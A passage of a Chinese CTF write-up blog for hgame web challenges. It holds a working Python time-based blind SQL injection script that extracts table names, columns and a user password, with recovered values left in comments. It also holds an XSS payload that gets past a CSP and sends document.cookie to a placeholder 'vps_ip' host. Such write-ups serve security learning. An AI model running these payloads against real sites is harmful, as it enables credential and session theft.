class="comment"># table_len 13</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">"if(length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%%3d'babysql'))%%3d%s,benchmark(30000000,sha(1)),1)"</span> % str(i)</span><br><span class="line">    req_url = url % (payload)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    res = requests.get(req_url,cookies=cookie)</span><br><span class="line">    <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"table_len: "</span> + str(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># messages,user</span></span><br><span class="line">table = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">14</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%%3d'babysql'),%s,1))%%3d%s,benchmark(30000000,sha(1)),1)"</span> % (str(i),str(j))</span><br><span class="line">        req_url = url % (payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.get(req_url, cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">4</span>:</span><br><span class="line">            table += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"table_name: "</span>+table</span><br><span class="line"></span><br><span class="line"><span class="comment"># column_len 16</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">"if(length((select+group_concat(column_name)+from+information_schema.columns+where+table_name%%3d'user'))%%3d%s,benchmark(30000000,sha(1)),1)"</span> % str(i)</span><br><span class="line">    req_url = url % (payload)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    res = requests.get(req_url,cookies=cookie)</span><br><span class="line">    <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"column_len: "</span> + str(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># id,name,password</span></span><br><span class="line">column = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name%%3d'user'),%s,1))%%3d%s,benchmark(30000000,sha(1)),1)"</span> % (str(i),str(j))</span><br><span class="line">        req_url = url % (payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.get(req_url, cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">4</span>:</span><br><span class="line">            column += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"column_name: "</span> + column</span><br><span class="line"></span><br><span class="line"><span class="comment"># len(name)=6 len(password)=28</span></span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="comment">#     payload = "if(length((select+password+from+user+limit+0,1))%%3d%s,benchmark(30000000,sha(1)),1)" % str(i)</span></span><br><span class="line"><span class="comment">#     req_url = url % (payload)</span></span><br><span class="line"><span class="comment">#     # print req_url</span></span><br><span class="line"><span class="comment">#     start_time = time.time()</span></span><br><span class="line"><span class="comment">#     res = requests.get(req_url,cookies=cookie)</span></span><br><span class="line"><span class="comment">#     if time.time() - start_time &gt;= 4:</span></span><br><span class="line"><span class="comment">#         print i</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     i += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cosmos</span></span><br><span class="line"><span class="comment"># f1FXOCnj26Fkadzt4Sqynf6O7CgR</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">29</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select+password+from+user+limit+0,1),%s,1))%%3d%s,benchmark(30000000,sha(1)),1)"</span> % (str(i),str(j))</span><br><span class="line">        req_url = url % (payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.get(req_url, cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">4</span>:</span><br><span class="line">            password += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"password: "</span> + password</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h4><p>存在CSP，限制了内联的js代码，并且限制了只能从同域下加载静态资源⽂件。在实际应⽤中，遇到这种CSP⼀般是找该站是否有⽂件上传点，也可以同源下有没有可以执⾏任意 JS 代码的 evil.js ⽂件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
+
+<p>通过抓包发现存在<code>/send?message=</code>,并且此接口不存在CSP，于是构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriscriptpt src=&quot;/send?message=window.open(&apos;http://vps_ip:port/?&apos;%2bdocument.cookie)&quot;&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/hgame/web/3_3/2.jpg" alt="2"></p>
+<p>修改token访问flag即可</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/03/express学习/" rel="next" title="express学习">
+                <i class="fa fa-chevron-left"></i> express学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/24/春秋杯新春战役网络安全公益赛/" rel="prev" title="春秋杯新春战役网络安全公益赛">
+                春秋杯新春战役网络安全公益赛 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Glarcy">
+            
+              <p class="site-author-name" itemprop="name">Glarcy</p>
+              <p class="site-description motion-element" itemprop="description">web小菜鸡</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io/" title="Twings" target="_blank">Twings</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xi4or0uji.github.io/" title="Xi4or0uji" target="_blank">Xi4or0uji</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://zszcr.github.io/" title="zs0zrc" target="_blank">zs0zrc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#week1"><span class="nav-number">1.1.</span> <span class="nav-text">week1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Cosmos-的博客"><span class="nav-number">1.1.1.</span> <span class="nav-text">Cosmos 的博客</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#接-头-霸-王"><span class="nav-number">1.1.2.</span> <span class="nav-text">接 头 霸 王</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-World"><span class="nav-number">1.1.3.</span> <span class="nav-text">Code World</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#🐔尼泰玫"><span class="nav-number">1.1.4.</span> <span class="nav-text">🐔尼泰玫</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#week2"><span class="nav-number">1.2.</span> <span class="nav-text">week2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Cosmos的博客后台"><span class="nav-number">1.2.1.</span> <span class="nav-text">Cosmos的博客后台</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cosmos的留言板-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">Cosmos的留言板-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cosmos的新语言"><span class="nav-number">1.2.3.</span> <span class="nav-text">Cosmos的新语言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cosmos的聊天室"><span class="nav-number">1.2.4.</span> <span class="nav-text">Cosmos的聊天室</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#week3"><span class="nav-number">1.3.</span> <span class="nav-text">week3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#序列之争-Ordinal-Scale"><span class="nav-number">1.3.1.</span> <span class="nav-text">序列之争 - Ordinal Scale</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二发入魂！"><span class="nav-number">1.3.2.</span> <span class="nav-text">二发入魂！</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cosmos的二手市场"><span class="nav-number">1.3.3.</span> <span class="nav-text">Cosmos的二手市场</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cosmos的留言板-2"><span class="nav-number">1.3.4.</span> <span class="nav-text">Cosmos的留言板-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cosmos的聊天室2-0"><span class="nav-number">1.3.5.</span> <span class="nav-text">Cosmos的聊天室2.0</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Glarcy</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
